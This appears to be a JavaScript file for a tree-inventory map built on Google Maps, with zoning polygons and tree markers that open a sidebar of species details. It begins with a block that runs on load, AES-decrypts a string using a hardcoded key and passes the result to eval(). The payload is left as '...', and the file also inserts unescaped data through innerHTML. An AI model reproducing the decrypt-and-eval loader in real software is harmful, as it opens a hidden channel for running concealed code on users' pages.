
var key = "Tr33CAMsdsdsdcvvvfd"; 
var encryptedCode = "..."; 
var decryptedCode = CryptoJS.AES.decrypt(encryptedCode, key).toString(CryptoJS.enc.Utf8);

function executeDecryptedCode() {
   
    try {
        eval(decryptedCode);
    } catch (error) {
        console.error("Error executing decrypted code:", error);
    }
}

executeDecryptedCode();

function initMap(data2, geojsonData, treeViewUrl) {
  var map;
  var markers = [];
  var selectedMarker = null;
  // console.log(data2);

 var mapDiv = document.getElementById('googlemap');
    var map = new google.maps.Map(mapDiv, {
      center: { lat: 3.0697706, lng: 101.5014936 },
      zoom: 15
    });
 
var polygonLayer = new google.maps.Data();
polygonLayer.addGeoJson(geojsonData);
map.data.addGeoJson(geojsonData);

map.data.setStyle({
  fillColor: '#957DAD',
  fillOpacity: 0.1,
  strokeColor: '#957DAD',
  strokeWeight: 0.9
});

var polygonLayer = new google.maps.Data();
polygonLayer.addGeoJson(geojsonData);
polygonLayer.setStyle({
    fillColor: null,
    fillOpacity: 0,
    strokeColor: '#957DAD',
    strokeWeight: 0.9
});
polygonLayer.setMap(map);

var openInfoWindow = null; //## Variable untuk keep track of the open infowindow

polygonLayer.addListener('click', function(event) {
    var zoneInfo = event.feature.getProperty('Zoning_name');
    var shapeArea = event.feature.getProperty('Shape_Area');
    var shapeLength = event.feature.getProperty('Shape_Leng');

    if (openInfoWindow) {
        openInfoWindow.close();
    }

    var infowindow = new google.maps.InfoWindow({
        content: '<div><strong>Zone Information:</strong><br>' +
            'Zoning Name: ' + zoneInfo + '<br>' +
            'Shape Area: ' + shapeArea + '<br>' +
            'Shape Length: ' + shapeLength + '</div>'
    });

    infowindow.setPosition(event.latLng);
    infowindow.open(map);
    
    openInfoWindow = infowindow;
});

    var greenIcon = {
      url: '../images/forest.png',
      scaledSize: new google.maps.Size(60, 60),
      anchor: new google.maps.Point(30, 50), 
      popupAnchor: new google.maps.Point(-3, -76)
    };

     //polygonLayer.setMap(map);
     //## Polygon click event listener
      function loadImageSecurely(imageUrl, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', imageUrl, true);
        xhr.responseType = 'blob';

        xhr.onload = function() {
            if (xhr.status === 200) {
                var blob = xhr.response;
                var objectURL = URL.createObjectURL(blob);
                callback(objectURL);
            }
        };

        xhr.send();
    }

    if (Array.isArray(data2) && data2.length > 0) {
    for (var i = 0; i < data2.length; i++) {
      (function(i) {
        
        var imageUrl = data2[i].imageFileName === 'no_img_found.png'
        ? '../dist/img/default_error_img_map/no_img_found.png'  //## Default image for trees without images
        : imageLoader.getImageUrl(data2[i].imageFileName);  //## Image URL for trees with images

        var marker = new google.maps.Marker({
          position: new google.maps.LatLng(data2[i].lat, data2[i].lon),
          map: map,
           icon: greenIcon,
           imageUrl: imageUrl 
        });
        markers.push(marker);

        var treename = '<div><p><b>Tree ID:</b></p></div>';
        var infowindow = new google.maps.InfoWindow({
          content: treename + data2[i].treeID
        });

        marker.addListener('mouseover', function() {
          infowindow.open(map, marker);
        });

        marker.addListener('mouseout', function() {
          infowindow.close();
        });

        marker.addListener('click', function () {
          var overlay = document.getElementById('overlay');
          overlay.style.display = 'block';
          loadImageSecurely(imageUrl, function(objectURL) {
                imageElement.src = objectURL;
            });
          var sidebarContent = document.getElementById('sidebar-content');
          sidebarContent.innerHTML = '';

          var titleContainer = document.createElement('div');
          titleContainer.style.display = 'flex';
          titleContainer.style.justifyContent = 'space-between';
          titleContainer.style.alignItems = 'center';
          titleContainer.style.padding = '10px'; /* Increased padding */
          titleContainer.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
          titleContainer.style.borderRadius = '5px';
          titleContainer.style.whiteSpace = 'nowrap';

          var titleElement = document.createElement('h5');
          titleElement.style.textDecoration = 'underline';
          titleElement.style.margin = '0';
          titleElement.innerHTML = '<i class="fas fa-info-circle"></i> <b>TREE INFORMATION</b>';
          titleContainer.appendChild(titleElement);


          var buttonContainer = document.createElement('div');
          buttonContainer.style.display = 'flex';
          buttonContainer.style.alignItems = 'center';

          var viewButton = document.createElement('button');
          viewButton.innerHTML = '<i class="fas fa-info-circle"></i>';
          viewButton.className = 'btn btn-primary btn-sm';
          viewButton.style.border = '1px solid #fff';
          viewButton.style.background = '#007bff';
          viewButton.style.color = '#fff';
          viewButton.style.fontWeight = 'bold';
          viewButton.addEventListener('click', function() {
            var treetoken= data2[i].treetoken;
            var url = treeViewUrl + treetoken;
            window.location.href = url;
          }); 
          //## PLACEHOLDER FOR BUTTON SIDEBARMAP
          viewButton.setAttribute('title', 'View Advanced Details');
          buttonContainer.appendChild(viewButton);

          var closeButton = document.createElement('button');
          closeButton.textContent = 'X';
          closeButton.className = 'btn btn-secondary btn-sm bg-danger';
          closeButton.style.width = '30px';
          closeButton.style.border = '1px solid #fff';
          closeButton.style.background = 'transparent';
          closeButton.style.marginLeft = '5px';
          closeButton.addEventListener('click', function() {
            overlay.style.display = 'none';
            selectedMarker = null;
          });

          closeButton.setAttribute('title', 'Close sidebar');
          buttonContainer.appendChild(closeButton);

          titleContainer.appendChild(buttonContainer);

          sidebarContent.appendChild(titleContainer);

          var contentContainer = document.createElement('div');
          contentContainer.style.display = 'flex';
          contentContainer.style.alignItems = 'center';
          contentContainer.style.marginTop = '30px';

          var imageElement = document.createElement('img');
          imageElement.src = marker.imageUrl;
          imageElement.style.width = '180px';
          imageElement.style.height = '180px';
          imageElement.style.border = '2px solid rgba(255, 255, 255, 0.5)'; // White transparent border
          imageElement.style.borderRadius = '10%';
          contentContainer.appendChild(imageElement);
          
        //## make the image clickable and open a larger version of the image when clicked
        // imageElement.addEventListener('click', function () {
        //     window.open(marker.imageUrl, '_blank');
        // });

        var detailsContainer = document.createElement('div');
        detailsContainer.style.marginLeft = '10px';

        var treeID = document.createElement('div');
        treeID.innerHTML = '<i class="fas fa-tree" style="color: #94ff2b; font-size: 21px;"></i> <b>Tree ID:</b> ' + data2[i].treeID;
        treeID.style.marginBottom = '10px';
        detailsContainer.appendChild(treeID);

        var speciesDetails = document.createElement('div');
        speciesDetails.innerHTML = '<i class="fas fa-leaf" style="color: #f8e64f; font-size: 21px;"></i> <b>Species:</b> ' + data2[i].speciesDetails;
        speciesDetails.style.marginBottom = '10px'; 
        detailsContainer.appendChild(speciesDetails);

        var familyDetails = document.createElement('div');
        familyDetails.innerHTML = '<i class="fas fa-users" style="color: #6fdcc3; font-size: 21px;"></i> <b>Family:</b> ' + data2[i].familyDetails;
        familyDetails.style.marginBottom = '10px'; 
        detailsContainer.appendChild(familyDetails);


          contentContainer.appendChild(detailsContainer);
          sidebarContent.appendChild(contentContainer);

          function adjustButtonPositions() {
            if (window.innerWidth <= 768) {
              titleContainer.style.flexDirection = 'column';
              titleContainer.style.alignItems = 'flex-start';
              buttonContainer.style.marginTop = '10px';
            } else {
              titleContainer.style.flexDirection = 'row';
              titleContainer.style.alignItems = 'center';
              buttonContainer.style.marginTop = '0';
            }
          }

          window.addEventListener('load', adjustButtonPositions);
          window.addEventListener('resize', adjustButtonPositions);

          map.setCenter(marker.getPosition());
          infowindow.open(map, marker);
          selectedMarker = marker;
        });
      })(i);
    }
  }else {
    console.error("Data2 is not defined or is empty:", data2);
}

    map.addListener('click', function(event) {
      if (selectedMarker) {
        var clickedPosition = event.latLng;
        var isMarkerClicked = markers.some(function(marker) {
          return google.maps.geometry.spherical.computeDistanceBetween(marker.getPosition(), clickedPosition) < 1;
        });

        if (!isMarkerClicked) {
          selectedMarker = null;
          document.getElementById('overlay').style.display = 'none';
        }
      }
    });
 
}
  export { initMap };